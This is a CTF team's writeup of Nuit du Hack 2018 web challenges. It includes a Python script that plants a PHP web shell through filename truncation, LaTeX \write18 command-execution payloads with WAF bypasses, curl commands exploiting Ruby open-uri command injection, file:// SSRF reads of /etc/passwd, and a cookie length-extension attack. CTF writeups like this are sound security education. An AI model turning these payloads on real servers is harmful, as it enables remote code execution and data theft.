# Nuit du Hack CTF Quals 2018


**It's recommended to read our responsive [web version](https://balsn.github.io/ctf_writeup/20180330-nuitduhackctf/) of this writeup.**


 - [Nuit du Hack CTF Quals 2018](#nuit-du-hack-ctf-quals-2018)
   - [Pwn](#pwn)
   - [reverse](#reverse)
   - [Web](#web)
     - [PixEditor (bookgin)](#pixeditor-bookgin)
     - [Linked Out (bookgin)](#linked-out-bookgin)
     - [Crawl Me Maybe (unsolved, written by bookgin)](#crawl-me-maybe-unsolved-written-by-bookgin)
     - [CoinGame (bookgin)](#coingame-bookgin)
     - [WaWaCoin (unsolved, written by bookgin)](#wawacoin-unsolved-written-by-bookgin)
     - [Cryptolol (solved by sasdf)](#cryptolol-solved-by-sasdf)



## Pwn 

## reverse

## Web

### PixEditor (bookgin)

In this challenge, we can POST a list of RGBA pixels, with specific format JPG, PNG, BMP, GIF. After sending the request to the server, we can download the image we just uploaded. The filename will remain the same.

```
data=[255,0,0...]
name=image.JPG
format=JPG
```

My intuition is to upload a web shell. However, I've tried lot of filenames but they all failed. It seems the filename is properly parsed by php `basename()`.

Next, I wonder what will happend if I'm trying to create a filename which is longer than 255 bytes, because the [maximum filename length](https://en.wikipedia.org/wiki/Comparison_of_file_systems#Limits) for `ext4` is 255. To my surprise, a filename with only 55 bytes gets truncated!

- POST filename `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.bmp`
- The server saves the file as `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx`

The rest is trivial. We just need to manipulate the pixels to create a web shell. Pleases check my script for details.

```python=
#!/usr/bin/env python3
# Python 3.6.4
import requests
import json

payload = '''<?php
system($_GET["j"]);'''

bmp = []
for i in range(0, len(payload), 3):
    bmp += list(payload[i:i+3].encode())[::-1] + [0x00]
bmp += [0 for _ in range(4096 - len(bmp))]
payload = dict(
    data=json.dumps(bmp),
    name='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRST.phpXYZ.BMP',
    format='BMP'
)
print(requests.post('http://pixeditor.challs.malice.fr/save.php', data=payload).text)
```

Just `j=cat /flag` and win.

After I already got the flag, one of my teammate found this in the javascript. However, I didn't notice that.

`inputName.maxLength = 45; // 50 - Len(Extension) - Filename will be truncated if len > 50`

### Linked Out (bookgin)

We can upload a YAML config file, and the website will render the content through LaTeX.

Our first try is to insert some latex syntax `\texttt{GG} \textbf{greatest}`. It gets rendered.

How about some evil RCE latex syntax?

```
\immediate\write18{ls > aaa.txt}
\input{aaa.txt}
```

We soon found the flag is in `/flag`. Nevertheless, we fail to cat it out. We only got a parsing error. That's weird as I'm sure we have read permission via `ls -all /flag`.

After a few tries, we found `cat Makefle`, `pwd` are giving us parsing error. I wonder if there is a WAF. A quick PoC `echo NDH` and `echo a` solves the mystery - it's WAFed. The underscore is WAFed as well.

So we just bypass it with powerful `sed`. Here is the payload:

```yaml=
- '\immediate\write18{cat /flag | sed "s/_/Q/g" | sed "s/NDH/WWW/g"> see}'
- '\input{see}'
```

### Crawl Me Maybe (unsolved, written by bookgin)

The website will crawl the user-provided URL and displays the content. A quick test `url[]=` leads to an error which leaks the ruby source code:

```ruby
require 'open-uri'
require 'nokogiri'


set :bind, '0.0.0.0'
set :port, 8080


get '/' do
  @title = 'Crawl Me Maybe!'
  erb :index
end

post '/result' do
  @title = 'Crawl Me Maybe!'
  url = params["url"]

  if /sh|dash|bash|rbash|zsh/.match(url) || url.match('flag') || url.match('txt') || url.index('*') != nil || (url.index('|') != nil && !(url.index('cat') != nil || url.index('ls') != nil))
    @result = "Attack detected"
    erb :error
  else
    begin
      page = open(url)
    rescue StandardError => e
      @result = "Invalide url"
      erb :error
    else
      begin
        page = Nokogiri::HTML(page) { |config| config.strict }
        @result = "Page well formed !"
        @content = page.text
        erb :result
      rescue Nokogiri::HTML::SyntaxError => e
        @result = "caught exception: #{e}"
        erb :error
      end
    end
  end
end
```

1. `open-uri` is very dangerous. `open('| ls')` results in RCE, while `open('/etc/passwd')` results in local file leaks.
2. CHECK THE WAF CAREFULLY (we fail to do so). It seems working, but in fact, `| ls` is still a valid payload.

Payload:
```shell=
# locate the flag
$ curl 'http://crawlmemaybe.challs.malice.fr/result' --data 'url=| ls >/dev/null; find / | grep fla'
/home/challenge/src/.flag.txt

# get the flag
$ curl 'http://crawlmemaybe.challs.malice.fr/result' --data 'url=| ls >/dev/null; cat /home/challenge/src/.fla?.t?t'
NDH{CUrly_Ruby_J3p53n}
```


This one is acctually very simple, but we are too tired to solve this...... Never stay up late playing CTf, guys.


### CoinGame (bookgin)

The website is a online `curl` service, with PHP as the backend.

`file:///etc/passwd` still works lika a charm, and what's more intriguing is that there is a user named `tftp`.

Let's get information as more as possible:

- source code: `file:///var/www/html/curl.php`
    - PHP curl: We can use `gopher`, though it's useless in the challenge. Refer to [SSRF bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit).
- OS: file:///etc/os-release
- tftp config file: `file:///etc/default/tftpd-hpa`
```
# /etc/default/tftpd-hpa
 
TFTP_USERNAME="tftp"
TFTP_DIRECTORY="/home/CoinGame"
TFTP_ADDRESS="0.0.0.0:69"
TFTP_OPTIONS="--secure --create"
```

Nevertheless, we are not able to connect to the tftp remotely. Then, we tried to dig some files under `/home/CoinGame` but none of them works. We got stuck here.......

Suddenly, there arises inspiration in my mind. I start googling the author `Designed by totheyellowmoon`, accidently finding that he has only one repo, which is named `CoinGame`.

Next, just crawl all the contents thorugh `file:///home/CoinGame/README.md` .... and diff with the repo. We found lots of images are not the same, and they contatins the flag.

Hmm, I don't think this challenge is well-designed.

### WaWaCoin (unsolved, written by bookgin)

In the login page, if the username doesn't not exist, we'll get `bad username`. Then, through a quick enumeration we found `admin` exists.

In the manager page, we are set a cookie by the server, `session=757365723d64656d6f|9183ff6055a46981f2f71cd36430ed3d9cbf6861`. The first part is `user=demo` in hex, and the second part is a 20 bytes SHA1-hash. Manipulating the `user=admin` gets nothing, as the second part SHA1 seems like a signature. Therefore, the server will validate the signature and the first part.

Later we found the category of the problem is updated to `crypto/web`, so length extension attack comes to my mind.

However, we only send the payload to `/stealmoney` and `/login`. What's worse, we doesn't follow the redirect. In fact, one of the payload readlly works, but we send to the wrong API. Sending to `/stealmoney` will always redirect you to other page. The correct one is `/manager`.

You can check [@Becojo's script](https://gist.github.com/Becojo/17dbd49b5e8f25d9d7534afc2ed76c64) for more detail. It seems that appending `;user=admin` or `&user=admin` both works.

@sasdf, @sces60107 and I acctually spent 6+ hours on the frustrating challenge (sob).

### Cryptolol (solved by sasdf)

To be completed
